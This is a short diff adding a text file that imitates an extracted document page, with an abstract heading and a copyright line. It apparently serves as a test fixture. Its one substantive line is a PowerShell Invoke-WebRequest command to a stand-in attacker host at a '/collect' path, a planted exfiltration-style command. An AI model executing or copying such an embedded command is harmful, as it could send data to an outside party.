@@ -1,0 +1,7 @@
+Page 1 of 1
+
+Abstract
+
+powershell -c Invoke-WebRequest https://evil.example/collect
+
+Copyright 2026 Example Ltd.
